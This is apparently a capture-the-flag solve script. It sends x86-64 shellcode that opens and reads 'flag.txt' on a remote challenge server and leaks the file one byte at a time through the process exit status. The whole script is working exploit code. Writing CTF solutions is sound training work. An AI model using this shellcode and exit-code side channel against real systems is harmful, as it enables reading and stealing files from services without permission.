from pwn import *

shellcode_template = b"b066880424b06c88442401b06188442402b06788442403b02e88442404b07488442405b07888442406b07488442407b00088442408b8020000004889e7be000000000f054889e64889c7ba00010000b8000000000f05b8000000008a4424%s4889c7"
context.log_level = "error"

flag = b""
for i in range(0x100):
    p = remote("kitctf.me", 1338)
    p.recvuntil(b"> ")
    p.sendline(shellcode_template % (hex(i)[2:].rjust(2, "0").encode()))
    try:
        ret = p.recvline()
    except:
        break
    p.close()
    if b"returned non-zero exit status" in ret:
        flag_byte = bytes([int(ret.split(b"returned non-zero exit status ")[1].split(b".")[0])])
        if flag_byte == b"\n":
            break
        flag += flag_byte
        print(flag.decode())
    else:
        break

print(flag.decode())